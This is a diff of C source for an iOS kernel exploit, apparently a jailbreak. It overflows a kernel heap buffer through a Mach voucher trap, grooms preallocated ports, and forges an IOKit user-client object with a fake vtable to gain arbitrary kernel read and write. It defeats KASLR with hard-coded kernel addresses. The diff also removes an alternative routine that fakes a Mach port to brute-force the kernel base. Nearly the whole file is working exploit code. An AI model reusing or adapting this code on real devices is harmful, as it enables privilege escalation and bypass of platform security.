@@ -13,39 +13,12 @@
 #include <mach/mach_voucher_types.h>
 #include <mach/port.h>
 
-#import <mach-o/loader.h>
-#import <sys/mman.h>
-
 #include <CoreFoundation/CoreFoundation.h>
-#import <Foundation/Foundation.h>
-
-#include "offsets.h"
 
 // IOKit stuff
 
 #define kIOMasterPortDefault MACH_PORT_NULL
 #define IO_OBJECT_NULL MACH_PORT_NULL
-#define IO_BITS_ACTIVE 0x80000000
-#define	IKOT_TASK 2
-#define IKOT_IOKIT_CONNECT 29
-#define IKOT_CLOCK 25
-
-extern uint64_t procoff;
-
-typedef struct {
-    mach_msg_header_t head;
-    mach_msg_body_t msgh_body;
-    mach_msg_ool_ports_descriptor_t desc[256];
-    char pad[4096];
-} sprz;
-
-typedef natural_t not_natural_t;
-
-struct not_essers_ipc_object {
-    not_natural_t io_bits;
-    not_natural_t io_references;
-    char    io_lock_data[1337];
-};
 
 typedef mach_port_t io_iterator_t;
 typedef mach_port_t io_service_t;
@@ -55,86 +28,86 @@ typedef	char io_name_t[128];
 
 
 CFMutableDictionaryRef
-IOServiceMatching(const char* name);
+IOServiceMatching(const char* name );
 
 kern_return_t
 IOServiceGetMatchingServices(
-    mach_port_t masterPort,
-    CFDictionaryRef matching,
-    io_iterator_t * existing);
+                             mach_port_t masterPort,
+                             CFDictionaryRef matching,
+                             io_iterator_t * existing );
 
 io_service_t
 IOServiceGetMatchingService(
-    mach_port_t	masterPort,
-    CFDictionaryRef	matching);
+                            mach_port_t	masterPort,
+                            CFDictionaryRef	matching);
 
 io_object_t
 IOIteratorNext(
-    io_iterator_t	iterator);
+               io_iterator_t	iterator );
 
 kern_return_t
 IOObjectGetClass(
-    io_object_t	object,
-    io_name_t	className);
+                 io_object_t	object,
+                 io_name_t	className );
 
 kern_return_t
 IOServiceOpen(
-    io_service_t    service,
-    task_port_t	owningTask,
-    uint32_t	type,
-    io_connect_t  *	connect);
+              io_service_t    service,
+              task_port_t	owningTask,
+              uint32_t	type,
+              io_connect_t  *	connect );
 
 kern_return_t
 IOServiceClose(
-    io_connect_t	connect);
+               io_connect_t	connect );
 
 kern_return_t
 IOObjectRelease(
-    io_object_t	object);
+                io_object_t	object );
 
 kern_return_t
 IOConnectGetService(
-    io_connect_t	connect,
-    io_service_t  *	service);
+                    io_connect_t	connect,
+                    io_service_t  *	service );
 
 // mach_vm protos
 
 kern_return_t mach_vm_allocate
 (
-    vm_map_t target,
-    mach_vm_address_t *address,
-    mach_vm_size_t size,
-    int flags
-);
+ vm_map_t target,
+ mach_vm_address_t *address,
+ mach_vm_size_t size,
+ int flags
+ );
 
 kern_return_t mach_vm_deallocate
 (
-    vm_map_t target,
-    mach_vm_address_t address,
-    mach_vm_size_t size
-);
+ vm_map_t target,
+ mach_vm_address_t address,
+ mach_vm_size_t size
+ );
 
 
 
 mach_port_t prealloc_port(int size) {
     kern_return_t err;
-    mach_port_qos_t qos = { 0 };
+    mach_port_qos_t qos = {0};
     qos.prealloc = 1;
     qos.len = size;
-
+    
     mach_port_name_t name = MACH_PORT_NULL;
-
+    
     err = mach_port_allocate_full(mach_task_self(),
-        MACH_PORT_RIGHT_RECEIVE,
-        MACH_PORT_NULL,
-        &qos,
-        &name);
-
+                                  MACH_PORT_RIGHT_RECEIVE,
+                                  MACH_PORT_NULL,
+                                  &qos,
+                                  &name);
+    
     if (err != KERN_SUCCESS) {
         printf("pre-allocated port allocation failed: %s\n", mach_error_string(err));
         return MACH_PORT_NULL;
     }
-
+    
     return (mach_port_t)name;
 }
 
@@ -145,20 +118,20 @@ io_connect_t alloc_userclient() {
     kern_return_t err;
     if (service == MACH_PORT_NULL) {
         service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAccelerator"));
-
-        if (service == IO_OBJECT_NULL) {
+        
+        if (service == IO_OBJECT_NULL){
             printf("unable to find service\n");
             return 0;
         }
     }
-
+    
     io_connect_t conn = MACH_PORT_NULL;
     err = IOServiceOpen(service, mach_task_self(), 5, &conn); // AGXCommandQueue, 0xdb8
-    if (err != KERN_SUCCESS) {
+    if (err != KERN_SUCCESS){
         printf("unable to get user client connection\n");
         return 0;
     }
-
+    
     return conn;
 }
 
@@ -170,18 +143,18 @@ mach_port_t get_voucher() {
         .command = MACH_VOUCHER_ATTR_ATM_CREATE
     };
     static mach_port_t p = MACH_PORT_NULL;
-
+    
     if (p != MACH_PORT_NULL) {
         return p;
     }
-
+    
     kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&r, sizeof(r), &p);
-
+    
     if (err != KERN_SUCCESS) {
         printf("failed to create voucher (%s)\n", mach_error_string(err));
     }
     printf("got voucher: %x\n", p);
-
+    
     return p;
 }
 
@@ -220,12 +193,12 @@ uint64_t roundup(uint64_t val, uint64_t pagesize) {
 void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflow_data) {
     int pagesize = getpagesize();
     printf("pagesize: 0x%x\n", pagesize);
-
-
+    
+    
     // recipe_size will be used first as a pointer to a length to pass to kalloc
     // and then as a length (the userspace pointer will be used as a length)
     // it has to be a low address to pass the checks which make sure the copyin will stay in userspace
-
+    
     // iOS has a hard coded check for copyin > 0x4000001:
     // this xcodeproj sets pagezero_size 0x16000 so we can allocate this low
     static uint64_t small_pointer_base = 0x3000000;
@@ -236,47 +209,47 @@ void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overfl
         mapped = 1;
     }
     *(uint64_t*)recipe_size = kalloc_size; // the kernel allocation size
-
-                                           // this is how much data we want copyin to actually copy
-                                           // we make sure it only copies this much by aligning the userspace buffer
-                                           // such that after this many bytes there's an unmapped userspace page and the copyin stops and fails
+    
+    // this is how much data we want copyin to actually copy
+    // we make sure it only copies this much by aligning the userspace buffer
+    // such that after this many bytes there's an unmapped userspace page and the copyin stops and fails
     uint64_t actual_copy_size = kalloc_size + overflow_length;
-
+    
     uint64_t alloc_size = roundup(actual_copy_size, pagesize) + pagesize; // want a page after to unmap
-
+    
     uint64_t base = map(alloc_size);
-
+    
     // unmap the page at the end so we can terminate the copy
     uint64_t end = base + roundup(actual_copy_size, pagesize);
     unmap(end, pagesize);
-
+    
     // subtract the copy size from the end pointer to get the start so the last copy byte is right before the unmapped page:
     uint64_t start = end - actual_copy_size;
-
+    
     // fill in the data to copy:
     uint8_t* recipe = (uint8_t*)start;
-
+    
     memset(recipe, 0x41, kalloc_size);
-    memcpy(recipe + kalloc_size, overflow_data, overflow_length);
-
+    memcpy(recipe+kalloc_size, overflow_data, overflow_length);
+    
     // trigger the bug!
     mach_port_t port = get_voucher();
     kern_return_t err = mach_voucher_extract_attr_recipe_trap(
-        port,
-        1,
-        recipe,
-        recipe_size);
+                                                              port,
+                                                              1,
+                                                              recipe,
+                                                              recipe_size);
 }
 
 kern_return_t catch_exception_raise
 (
-    mach_port_t exception_port,
-    mach_port_t thread,
-    mach_port_t task,
-    exception_type_t exception,
-    exception_data_t code,
-    mach_msg_type_number_t codeCnt
-)
+ mach_port_t exception_port,
+ mach_port_t thread,
+ mach_port_t task,
+ exception_type_t exception,
+ exception_data_t code,
+ mach_msg_type_number_t codeCnt
+ )
 {
     // shouldn't reach
     //printf("catch_exception_raise\n");
@@ -286,57 +259,57 @@ kern_return_t catch_exception_raise
 uint8_t* crash_stack = NULL;
 
 // each time we get an exception message copy the first 32 registers into this buffer
-uint64_t crash_buf[32] = { 0 }; // use the 32 general purpose ARM64 registers
+uint64_t crash_buf[32] = {0}; // use the 32 general purpose ARM64 registers
 
 kern_return_t catch_exception_raise_state
 (
-    mach_port_t exception_port,
-    exception_type_t exception,
-    const exception_data_t code,
-    mach_msg_type_number_t codeCnt,
-    int *flavor,
-    const thread_state_t old_state,
-    mach_msg_type_number_t old_stateCnt,
-    thread_state_t new_state,
-    mach_msg_type_number_t *new_stateCnt
-)
+ mach_port_t exception_port,
+ exception_type_t exception,
+ const exception_data_t code,
+ mach_msg_type_number_t codeCnt,
+ int *flavor,
+ const thread_state_t old_state,
+ mach_msg_type_number_t old_stateCnt,
+ thread_state_t new_state,
+ mach_msg_type_number_t *new_stateCnt
+ )
 {
     //printf("catch_exception_raise_state\n");
     memcpy(crash_buf, old_state, sizeof(crash_buf));
-
+    
     // make the thread exit:
     memset(new_state, 0, sizeof(_STRUCT_ARM_THREAD_STATE64));
     _STRUCT_ARM_THREAD_STATE64* new = (_STRUCT_ARM_THREAD_STATE64*)(new_state);
-
+    
     // it needs a minimal stack:
     if (!crash_stack) {
         crash_stack = malloc(0x4000);
         crash_stack += 0x3ff0;
     }
-
+    
     *new_stateCnt = old_stateCnt;
-
+    
     new->__pc = (uint64_t)pthread_exit;
     new->__x[0] = 0;
     new->__sp = (uint64_t)crash_stack;
-
+    
     return KERN_SUCCESS;
 }
 
 kern_return_t catch_exception_raise_state_identity
 (
-    mach_port_t exception_port,
-    mach_port_t thread,
-    mach_port_t task,
-    exception_type_t exception,
-    exception_data_t code,
-    mach_msg_type_number_t codeCnt,
-    int *flavor,
-    thread_state_t old_state,
-    mach_msg_type_number_t old_stateCnt,
-    thread_state_t new_state,
-    mach_msg_type_number_t *new_stateCnt
-)
+ mach_port_t exception_port,
+ mach_port_t thread,
+ mach_port_t task,
+ exception_type_t exception,
+ exception_data_t code,
+ mach_msg_type_number_t codeCnt,
+ int *flavor,
+ thread_state_t old_state,
+ mach_msg_type_number_t old_stateCnt,
+ thread_state_t new_state,
+ mach_msg_type_number_t *new_stateCnt
+ )
 {
     // shouldn't reach
     //printf("catch_exception_raise_state_identity\n");
@@ -363,17 +336,17 @@ void* do_thread(void* arg) {
     struct thread_args* args = (struct thread_args*)arg;
     uint64_t buf[32];
     memcpy(buf, args->buf, sizeof(buf));
-
+    
     kern_return_t err;
     err = thread_set_exception_ports(
-        mach_thread_self(),
-        EXC_MASK_ALL,
-        args->exception_port,
-        EXCEPTION_STATE, // we want to receive a catch_exception_raise_state message
-        ARM_THREAD_STATE64);
-
+                                     mach_thread_self(),
+                                     EXC_MASK_ALL,
+                                     args->exception_port,
+                                     EXCEPTION_STATE, // we want to receive a catch_exception_raise_state message
+                                     ARM_THREAD_STATE64);
+    
     free(args);
-
+    
     load_regs_and_crash(buf);
     printf("no crashy?");
     return NULL;
@@ -391,14 +364,14 @@ int port_has_message(mach_port_t port) {
     mach_msg_trailer_t msg_trailer; // NULL trailer
     mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
     err = mach_port_peek(mach_task_self(),
-        port,
-        MACH_RCV_TRAILER_NULL,
-        &msg_seqno,
-        &msg_size,
-        &msg_id,
-        (mach_msg_trailer_info_t)&msg_trailer,
-        &msg_trailer_size);
-
+                         port,
+                         MACH_RCV_TRAILER_NULL,
+                         &msg_seqno,
+                         &msg_size,
+                         &msg_id,
+                         (mach_msg_trailer_info_t)&msg_trailer,
+                         &msg_trailer_size);
+    
     return (err == KERN_SUCCESS);
 }
 
@@ -406,38 +379,38 @@ int port_has_message(mach_port_t port) {
 void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
     struct thread_args* args = malloc(sizeof(struct thread_args));
     memset(args, 0, sizeof(struct thread_args));
-    memcpy(args->buf, buf, n * 8);
-
+    memcpy(args->buf, buf, n*8);
+    
     args->exception_port = port;
-
+    
     // start a new thread passing it the buffer and the exception port
     pthread_t t;
     pthread_create(&t, NULL, do_thread, (void*)args);
-
+    
     // associate the pthread_t with the port so that we can join the correct pthread
     // when we receive the exception message and it exits:
     kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
-    //printf("set context\n");
+    printf("set context\n");
     // wait until the message has actually been sent:
-    while (!port_has_message(port)) { ; }
-    //printf("message was sent\n");
+    while(!port_has_message(port)){;}
+    printf("message was sent\n");
 }
 
 // the returned pointer is only valid until the next call to this function
 // ownership is retained by this function
 uint64_t* receive_prealloc_msg(mach_port_t port) {
     kern_return_t err = mach_msg_server_once(exc_server,
-        sizeof(union max_msg),
-        port,
-        MACH_MSG_TIMEOUT_NONE);
-
+                                             sizeof(union max_msg),
+                                             port,
+                                             MACH_MSG_TIMEOUT_NONE);
+    
     printf("receive_prealloc_msg: %s\n", mach_error_string(err));
-
+    
     // get the pthread context back from the port and join it:
     pthread_t t;
     err = mach_port_get_context(mach_task_self(), port, (mach_port_context_t*)&t);
     pthread_join(t, NULL);
-
+    
     return &crash_buf[0];
 }
 
@@ -466,9 +439,9 @@ typedef struct _uint128_t {
 
 uint128_t rk128(uint64_t address) {
     uint64_t r_obj[11];
-    r_obj[0] = kernel_buffer_base + 0x8;  // fake vtable points 8 bytes into this object
+    r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
     r_obj[1] = 0x20003;                 // refcount
-    r_obj[2] = kernel_buffer_base + 0x48; // obj + 0x10 -> rdi (memmove dst)
+    r_obj[2] = kernel_buffer_base+0x48; // obj + 0x10 -> rdi (memmove dst)
     r_obj[3] = address;                 // obj + 0x18 -> rsi (memmove src)
     r_obj[4] = kernel_uuid_copy;        // obj + 0x20 -> fptr
     r_obj[5] = ret;                     // vtable + 0x20 (::retain)
@@ -477,28 +450,28 @@ uint128_t rk128(uint64_t address) {
     r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
     r_obj[9] = 0;                       // r/w buffer
     r_obj[10] = 0;
-
+    
     send_prealloc_msg(oob_port, r_obj, 11);
-
+    
     io_service_t service = MACH_PORT_NULL;
     printf("fake_obj: 0x%x\n", target_uc);
     kern_return_t err = IOConnectGetService(target_uc, &service);
-
+    
     uint64_t* out = receive_prealloc_msg(oob_port);
-    uint128_t value = { out[9], out[10] };
-
+    uint128_t value = {out[9], out[10]};
+    
     send_prealloc_msg(oob_port, legit_object, 30);
     receive_prealloc_msg(oob_port);
-
+    
     return value;
 }
 
 void wk128(uint64_t address, uint128_t value) {
     uint64_t r_obj[11];
-    r_obj[0] = kernel_buffer_base + 0x8;  // fake vtable points 8 bytes into this object
+    r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
     r_obj[1] = 0x20003;                 // refcount
     r_obj[2] = address;                 // obj + 0x10 -> rdi (memmove dst)
-    r_obj[3] = kernel_buffer_base + 0x48; // obj + 0x18 -> rsi (memmove src)
+    r_obj[3] = kernel_buffer_base+0x48; // obj + 0x18 -> rsi (memmove src)
     r_obj[4] = kernel_uuid_copy;        // obj + 0x20 -> fptr
     r_obj[5] = ret;                     // vtable + 0x20 (::retain)
     r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
@@ -506,312 +479,131 @@ void wk128(uint64_t address, uint128_t value) {
     r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
     r_obj[9] = value.lower;             // r/w buffer
     r_obj[10] = value.upper;
-
+    
     send_prealloc_msg(oob_port, r_obj, 11);
-
+    
     io_service_t service = MACH_PORT_NULL;
     printf("fake_obj: 0x%x\n", target_uc);
     kern_return_t err = IOConnectGetService(target_uc, &service);
-
+    
     receive_prealloc_msg(oob_port);
-
+    
     send_prealloc_msg(oob_port, legit_object, 30);
     receive_prealloc_msg(oob_port);
-
+    
     return;
 }
 
 // won't work for the final qword on a page if the next is unmapped...
-uint64_t rk64(uint64_t address) {
+uint64_t rk64(uint64_t address){
     uint128_t val = rk128(address);
     return val.lower;
 }
 
-void wk64(uint64_t address, uint64_t value) {
+void wk64(uint64_t address, uint64_t value){
     uint128_t old = rk128(address);
-    uint128_t new = { value, old.upper };
+    uint128_t new = {value, old.upper};
     wk128(address, new);
-}
-
-uint64_t find_kernel_ptr(){
-    mach_port_t vch = 0;
-    
-    mach_voucher_attr_recipe_data_t *data = malloc(sizeof(mach_voucher_attr_recipe_data_t) + 0x10);
-    data->content_size = 0;
-    data->key=MACH_VOUCHER_ATTR_KEY_BANK;
-    data->command=610;
-    data->previous_voucher=MACH_PORT_NULL;
-    
-    kern_return_t lol = host_create_mach_voucher(mach_host_self(), data, sizeof(mach_voucher_attr_recipe_data_t), &vch);
-    
-    assert(lol==0 && vch!=0);
-    
-    
-    unsigned char* odata = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
-    unsigned char* fdata = mmap(odata+0x4000, 0x4000, PROT_NONE, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
-    assert(fdata == odata + 0x4000);
-    memset(odata, 0x42, 0x0);
-    
-    
-    uint64_t rsz = 0x100; // alloc size;
-    fdata -= rsz + 0x100; // overflow full chunk
-    
-    struct not_essers_ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
-    
-    mlock(fakeport, 0x8000);
-    
-    fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
-    fakeport->io_lock_data[12] = 0x11;
-    
-    *(uint64_t*) (fdata + rsz) = (uint64_t) fakeport;
-    
-    
-    mach_port_t* ports = calloc(800, sizeof(mach_port_t));
-    
-    for (int i = 0; i < 800; i++) {
-        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
-        mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
-    }
-    sprz msg1;
-    
-    memset(&msg1, 0, sizeof(sprz));
-    sprz msg2;
-    
-    memset(&msg2, 0, sizeof(sprz));
-    msg1.msgh_body.msgh_descriptor_count = 128;
-    
-    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-    msg1.head.msgh_local_port = MACH_PORT_NULL;
-    msg1.head.msgh_size = sizeof(msg1)-2048;
-    
-    mach_port_t* buffer = calloc(0x1000, sizeof(mach_port_t));
-    for (int i = 0; i < 0x1000; i++) {
-        buffer[i] = MACH_PORT_DEAD;
-    }
-    
-    for (int i = 0; i < 256; i++) {
-        msg1.desc[i].address = buffer;
-        msg1.desc[i].count = 0x100/8;
-        msg1.desc[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-        msg1.desc[i].disposition = 19;
-    }
-    
-    pthread_yield_np();
-    for (int i=1; i<300; i++) {
-        msg1.head.msgh_remote_port = ports[i];
-        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
-        assert(kret==0);
-    }
-    
-    pthread_yield_np();
-    for (int i=500; i<800; i++) {
-        msg1.head.msgh_remote_port = ports[i];
-        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
-        assert(kret==0);
-    }
-    
-    pthread_yield_np();
-    for (int i=300; i<500; i++) {
-        msg1.head.msgh_remote_port = ports[i];
-        if (i%4 == 0) {
-            msg1.msgh_body.msgh_descriptor_count = 1;
-        } else {
-            msg1.msgh_body.msgh_descriptor_count = 256;
-        }
-        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
-        assert(kret==0);
-    }
-    
-    pthread_yield_np();
-    for (int i = 300; i<500; i+=4) {
-        msg2.head.msgh_local_port = ports[i];
-        kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
-        if(!(i < 380))
-        ports[i] = 0;
-        assert(kret==0);
-    }
-    for (int i = 300; i<380; i+=4) {
-        msg1.head.msgh_remote_port = ports[i];
-        msg1.msgh_body.msgh_descriptor_count = 1;
-        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
-        assert(kret==0);
-    }
-    
-    mach_voucher_extract_attr_recipe_trap(vch, MACH_VOUCHER_ATTR_KEY_BANK, fdata, &rsz);
-    mach_port_t foundport = 0;
-    for (int i=1; i<500; i++) {
-        if (ports[i]) {
-            msg1.head.msgh_local_port = ports[i];
-            pthread_yield_np();
-            kern_return_t kret = mach_msg(&msg1, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
-            assert(kret==0);
-            for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
-                mach_port_t* ptz = msg1.desc[k].address;
-                for (int z = 0; z < 0x100/8; z++) {
-                    if (ptz[z] != MACH_PORT_DEAD) {
-                        if (ptz[z]) {
-                            foundport = ptz[z];
-                            goto foundp;
-                        }
-                        
-                    }
-                }
-            }
-            mach_msg_destroy(&msg1.head);
-            mach_port_deallocate(mach_task_self(), ports[i]);
-            ports[i] = 0;
-        }
-    }
-    printf("failed, retry");
-    return 0x0;
-foundp:
-    printf("found corruption %x", foundport);
-    
-    uint64_t textbase = 0xfffffff007004000;
-    
-    for (int i = 0; i < 0x300; i++) {
-        for (int k = 0; k < 0x40000; k+=8) {
-            *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
-            *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
-            
-            kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
-            
-            if (kret != KERN_FAILURE) {
-                goto gotclock;
-            }
-        }
-    }
-    printf("failed, retry");
-    return 0x0;
-    
-gotclock:;
-    uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
-    
-    leaked_ptr &= ~0x3FFF;
-    
-    fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
-    fakeport->io_references = 0xff;
-    char* faketask = ((char*)fakeport) + 0x1000;
-    
-    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
-    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
-    *(uint64_t*) (faketask + 0x10) = 0xee;
-    
-    while (1) {
-        int32_t leaked = 0;
-        *(uint64_t*) (faketask + procoff) = leaked_ptr - 0x10;
-        pid_for_task(foundport, &leaked);
-        if (leaked == MH_MAGIC_64) {
-            printf("found kernel text at %llx", leaked_ptr);
-            break;
-        }
-        leaked_ptr -= 0x4000;
-    }
-    
-    return leaked_ptr;
 }
 
 uint64_t prepare_kernel_rw() {
     int prealloc_size = 0x900; // kalloc.4096
-
-    for (int i = 0; i < 2000; i++) {
+    
+    for (int i = 0; i < 2000; i++){
         prealloc_port(prealloc_size);
     }
-
+    
     // these will be contiguous now, convienient!
-
+    
     mach_port_t holder = prealloc_port(prealloc_size);
     mach_port_t first_port = prealloc_port(prealloc_size);
     mach_port_t second_port = prealloc_port(prealloc_size);
-
+    
     // free the holder:
     mach_port_destroy(mach_task_self(), holder);
-
+    
     // reallocate the holder and overflow out of it
-    uint64_t overflow_bytes[] = { 0x1104,0,0,0,0,0,0,0 };
+    uint64_t overflow_bytes[] = {0x1104,0,0,0,0,0,0,0};
     do_overflow(0x1000, 64, overflow_bytes);
-
+    
     // grab the holder again
     holder = prealloc_port(prealloc_size);
-
+    
     prepare_prealloc_port(first_port);
     prepare_prealloc_port(second_port);
-
+    
     // send a message to the first port; overwriting the header of the second prealloced message
     // with a legitmate header:
-
-    uint64_t valid_header[] = { 0xc40, 0, 0, 0, 0, 0, 0, 0 };
+    
+    uint64_t valid_header[] = {0xc40, 0, 0, 0, 0, 0, 0, 0};
     send_prealloc_msg(first_port, valid_header, 8);
-
+    
     // send a message to the second port; writing a pointer to itself in the prealloc buffer
     send_prealloc_msg(second_port, valid_header, 8);
-
+    
     // receive on the first port, reading the header of the second:
     uint64_t* buf = receive_prealloc_msg(first_port);
-
-    /*for (int i = 0; i < 8; i++) {
+    
+    for (int i = 0; i < 8; i++) {
         printf("0x%llx\n", buf[i]);
-    }*/
-
+    }
+    
     kernel_buffer_base = buf[1];
-
+    
     // receive the message on second
     receive_prealloc_msg(second_port);
-
+    
     // send another message on first, writing a valid, safe header back over second
     send_prealloc_msg(first_port, valid_header, 8);
-
+    
     // free second and get it reallocated as a userclient:
     mach_port_deallocate(mach_task_self(), second_port);
     mach_port_destroy(mach_task_self(), second_port);
-
+    
     mach_port_t uc = alloc_userclient();
-
+    
     // read back the start of the userclient buffer:
     buf = receive_prealloc_msg(first_port);
-    //printf("user client? :\n");
-    /*for (int i = 0; i < 8; i++) {
+    printf("user client? :\n");
+    for (int i = 0; i < 8; i++) {
         printf("0x%llx\n", buf[i]);
-    }*/
-
+    }
+    
     // save a copy of the original object:
     memcpy(legit_object, buf, sizeof(legit_object));
-
+    
     // this is the vtable for AGXCommandQueue
     uint64_t vtable = buf[0];
-
+    
     // rebase the symbols
-    printf("vtable: 0x%llx\n",vtable);
     kaslr_shift = vtable - 0xFFFFFFF006FA2C50;
-    printf("kaslr_shift: 0x%llx\n",kaslr_shift);
-    kernel_base = off1 + kaslr_shift;
-    get_metaclass = off2 + kaslr_shift;
-    osserializer_serialize = off3 + kaslr_shift;
-    ret = off4 + kaslr_shift;
-    kernel_uuid_copy = off5 + kaslr_shift;
-
+    
+    kernel_base = 0xFFFFFFF007004000 + kaslr_shift;
+    get_metaclass = 0xFFFFFFF0074446DC + kaslr_shift;
+    osserializer_serialize = 0xFFFFFFF00745B0DC + kaslr_shift;
+    ret = 0xFFFFFFF0074446E4 + kaslr_shift;
+    kernel_uuid_copy = 0xFFFFFFF0074664F8 + kaslr_shift;
+    
     // save the port and userclient so we can use them for the r/w
     oob_port = first_port;
     target_uc = uc;
-
+    
     printf("all done!\n");
-
+    
     return kernel_base;
 }
 
 int jb_go() {
-    load_offsets();
-    //printf("kernel_ptr 0x%016llx",find_kernel_ptr());
     uint64_t kernel_base = prepare_kernel_rw();
     uint64_t val = rk64(kernel_base);
     printf("read from kernel memory: 0x%016llx\n", val);
-
+    
     uint64_t test_val = 0x41424344abcdef;
-    wk64(kernel_buffer_base + 0xfe0, test_val);
-    uint64_t read_back = rk64(kernel_buffer_base + 0xfe0);
-
+    wk64(kernel_buffer_base+0xfe0, test_val);
+    uint64_t read_back = rk64(kernel_buffer_base+0xfe0);
+    
     printf("wrote: 0x%016llx\n", test_val);
     printf("read back: 0x%016llx\n", read_back);
-
+    
     return 42;
 }
